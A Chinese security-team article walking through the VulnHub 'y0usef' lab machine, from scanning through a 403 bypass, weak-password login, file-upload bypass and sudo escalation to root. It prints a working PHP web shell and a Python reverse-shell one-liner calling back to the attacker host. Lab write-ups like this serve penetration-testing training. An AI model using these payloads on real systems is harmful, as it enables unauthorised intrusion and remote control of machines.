> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/wzlpyaT6u29X6Eu5oVNwDg)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VIL58RG3Kwb71ZGr57T0jFrQHdV8Q6GHPMvhkFHw3pxH6diaSTmpeKvA/640?wx_fmt=png)

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NYZL3bfk54sTP85YU9XhjlQsYldIRCH4807hdXaO0FnQ1iaMZUDMaLH3LiboMsnQ0rC7dca8NWBbM1/640?wx_fmt=svg)

y0usef

[靶机地址]: 

https://download.vulnhub.com/y0usef/y0usef.ova

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NYZL3bfk54sTP85YU9XhjlQsYldIRCH4807hdXaO0FnQ1iaMZUDMaLH3LiboMsnQ0rC7dca8NWBbM1/640?wx_fmt=svg)

内容简介

难度：低  
目标：取得 root 权限 + 2 Flag  
**主要运用攻击手段：**

*   主机发现 
    
*   端口扫描 
    
*   WEB 信息收集 
    
*   指纹探测 
    
*   弱口令 
    
*   403 Bypass 
    
*   文件上传及绕过 
    
*   base64 编码 
    
*   本地提权
    

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NYZL3bfk54sTP85YU9XhjlQsYldIRCH4807hdXaO0FnQ1iaMZUDMaLH3LiboMsnQ0rC7dca8NWBbM1/640?wx_fmt=svg)

环境准备

下载好文件，导入 VM Virtualbox 虚拟机。  
攻击机 kali：10.0.2.4  
靶机：10.0.2.8

  

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NYZL3bfk54sTP85YU9XhjlQsYldIRCH4807hdXaO0FnQ1iaMZUDMaLH3LiboMsnQ0rC7dca8NWBbM1/640?wx_fmt=svg)

攻击开始

**1. 主机发现**

```
arp-scan -l
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76V593YHwl3dibRfSnibE9JFSeGIXLlvzga6nUQnkVoA1QiasicxQn0iayhfTA/640?wx_fmt=png)

**2. 端口扫描**

```
nmap -p- 10.0.2.8
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VBDNKEWvIRvMzPj3zM9RjdmYCDBDPG0ibGhNnIsl2lxZy0daXr2WOWXA/640?wx_fmt=png)

**3. 服务发现**

```
nmap -p22,80 -sV 10.0.2.8
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VS774s7cAAablarP1lqLd3el4kggPDFdFtF1Xc0aEpquWQVuz7vwboQ/640?wx_fmt=png)

**4. 收集信息**

80 端口开启着 web 服务，我们直接访问。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76Vc1mSHFic3BIY8niaCXd7WkySjZQeqnlbYXBaMXRKhiaH3mFLFdzU0Q3lg/640?wx_fmt=png)

通过对页面进行信息收集，并没有发现有用的信息。  
查看目标靶机网站架构组成。

```
whatweb http://10.0.2.8
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VQLA1sGr2cfibqdxoSrficukN6NrJcgDM23ucj5d5tf3ic2ZbvYPmgWt2g/640?wx_fmt=png)

Apache 后端 web 服务，Bootstrap 前端框架，系统是 Ubuntu，使用的语言是 PHP-5.5.9。  
扫描目标靶机的目录。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76V5VPHjKTTUEUiaTSd3KpEmdmkMvBYicBus4sF2AgCiaha0FYib0iaCchibAqg/640?wx_fmt=png)

出现很多 403 响应码表示拒绝访问，经过测试`/index.php`和`/index.php/login/`仍是主页，但是有一个路径`/adminstration`，尝试访问。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76V5qLzYY1e0RQXibNH6E19fic2HMrLNL6XtTyEawMibcmINiamejHJhgDp9w/640?wx_fmt=png)

依旧是拒绝访问，说明这个地址是存在的，但是我们的权限很低没有办法访问，这个说明目标靶机的管理员做过权限控制，但是很多时候管理员做的权限控制很存在安全隐患，我们尝试是否可以绕过 403 授权限制。

**5.403 Bypass**

burp suite 抓包。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VTO1PFqu8A5Tx2PYya7fX2qvgricIcYyuBp0aMX93Yonftia6LiaqsTeBA/640?wx_fmt=png)

修改数据包头部，添加`X-Fprwarded-For`让目标靶机认为这个请求是来自他自己的请求

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76V3y9oN58lPUV85WzfxFicWFNHqI0n3hzcKQQ6tGfiaXRyzZZicGsJRgcAg/640?wx_fmt=png)

成功访问。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VbYrZsKT7niaazJV0JbXLX2sCNMMsgSQeJQpWgBtgGS38LT7ZvtkonCg/640?wx_fmt=png)

**6. 测试漏洞**

我们尝试登录，最终经过测试目标靶机存在弱口令`admin`，`admin`，继续 burp suite 抓包，每一个包都加上`X-Forwarded-For: 127.0.0.1`，然后`forward`。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VYEvyEFgRib3cSibejmSIKh6ASeibOFNIHzicx3NYCJaJCULumiaNqv00PRQ/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VnEAhaEruYXic6QcA5kWV4eUOjlicXSiaohtJD4eYkCjSw5oaJEvZc4SYQ/640?wx_fmt=png)

成功进入后台，在后台中我们发现了 Upload file，依旧利用 burp suite 进行访问，进入 Upload file 页面。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76V4olHlicoj3EIcEdEW0UEPp1CJxgchHTmuua3hEgxUbF2KhbnOiaYaUNA/640?wx_fmt=png)

**7. 文件上传**

上传一个 shell

```
<?php $var=shell_exec($_GET['axpmyw']); echo $var ?>
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VUKWLniaibpc3CsCRLgCPlicCUjzCPib3camQPETsScAgibUgqpKPtc6ABwQ/640?wx_fmt=png)

我们直接上传 php 的 shell  

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VhUpBIbb0rtlBgJQFeiaY6pog8SQfqgvXoDLm4HdcqrLbEhJlkFcRBlA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VPrZuBpib23QcSYmRk2xQyW5dib9quicECZqIC0bsajnGrdJKapFaAeVJA/640?wx_fmt=png)

发现目标靶机有限制，不允许上传，尝试绕过限制，经过测试当修改 Content-Type 时可以上传成功。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76V4TMa3gml6OpZKroeGNgMQ8QiaW1x2HPX5OHaoxPiaUH5IpObmzFiayFSQ/640?wx_fmt=png)

利用 BurpSuite 访问。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VEcPmGfCISzwYet5NnIbGFjnrs5CRsJaVsWLk5TF2tObcbR355tfXPg/640?wx_fmt=png)

传入参数。

```
?axpmyw=id
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76Vm4KvNiasSzQJXflJlTNXhky7Ot7tnjq1khJzUZoyILgdgt2eNHgAaAg/640?wx_fmt=png)

**8. 反弹 shell**

shell 成功上传，并且可以利用 shell 执行命令，查看一下目标靶机有没有 python 环境。

```
?axpmyw=which python
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VSP6PkicnWPPzqv14QNibhB8U0LoiaRQB7WghdfyGOLxZrgluqLD2aB1Mg/640?wx_fmt=png)

有 python 环境，我们可以利用 python 反弹 shell，脚本如下：

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.2.4",4444));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

开启监听。  

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VAYENOsyxQvpmwlQgF5qlG1oLib4ptmajYlXJkR4YT4xV1ba7rtZSq9g/640?wx_fmt=png)

反弹 shell

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VK54dL2ITKzwvy9sraQhM0etYgHNCAkFs0iaicjSD64u99ldNTuUqBibPw/640?wx_fmt=png)

成功获取一个 shell

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VBibscMpCDGicBlNsamv1edHuce4DgCjicFLKnB5n6VnrhuzUBMLrzLZEQ/640?wx_fmt=png)

升级一下目标靶机的 shell

```
python -c "import pty; pty.spawn('/bin/bash')"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VDO8rqJ378vKaUogWIh8iab9J7eSsOqLjMQ1puyRC5ZH2NQfLECW9RrA/640?wx_fmt=png)

在 /home 目录下找到一个 flag

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VKKGaibsCB8pp1NhnvqPTfVYt17lC307h8RRF48AicbRDdNxDvAye82xA/640?wx_fmt=png)

```
c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=
```

这一段明显是一串 base64 编码，尝试解码。

```
ssh : 
user : yousef 
pass : yousef123
```

提示 ssh 的用户名和密码，ssh 登录。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VIoCicicWibopibSIIqpJNkFw5ybYapoZkEUhB8RsX78kJkw21W7nbM5xicg/640?wx_fmt=png)

通过查看 id 发现 youser 账号可以执行 sudo 命令，而且可以运行这个靶机上的所有程序。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VyHicRXsmwdRBty2jU96kwplibFcSw8lBtthicLfWckvdZCBJyouBgicwow/640?wx_fmt=png)

**9. 权限提升**

切换 root 权限。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VbA7m7WX2vzT1BLwpMeLcMticHiacpsWibF1kO8wGHywqPYbQkzEkOhnQw/640?wx_fmt=png)

在 /root 目录下发现了第二个 flag

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVwibJQlVZnlOFmYic9smR76V3O8ibUtgBX8IPibBCWsiaTcssN69MRbXZrfib6jmAuwd4dggM6sWOia7lFQ/640?wx_fmt=png)

```
WW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzEx
```

很明显也是 base64 编码，进行解码。

```
You've got the root Congratulations any feedback content me twitter @y0usef_11
```

这是靶机作者的一段留言。

**安恒信息**

✦

杭州亚运会网络安全服务官方合作伙伴

成都大运会网络信息安全类官方赞助商

武汉军运会、北京一带一路峰会

青岛上合峰会、上海进博会

厦门金砖峰会、G20 杭州峰会

支撑单位北京奥运会等近百场国家级

重大活动网络安保支撑单位

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VQ10niaWup42WhBAhVgGPNMU4dAUfYHV2RBpVciazbFCmNjmI9uHxX7CQ/640?wx_fmt=jpeg)

END

![图片](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JVwibJQlVZnlOFmYic9smR76V0VSWrNTsIeZNM7XoZySKicLicuMNdSc5NorIl3smhHUb9Uewk9enhTzg/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VHkg5jO4kwvH3ytut0BPsVW6PMUeqOPKpwJpQrXNeVmsGdFwofS2LfA/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JVwibJQlVZnlOFmYic9smR76VUAh7F34ayyNZrk4X2ibV0c9BaEFicclUBqlMsDpFPedHOm70m2Qea3bg/640?wx_fmt=gif)

**长按识别二维码关注我们**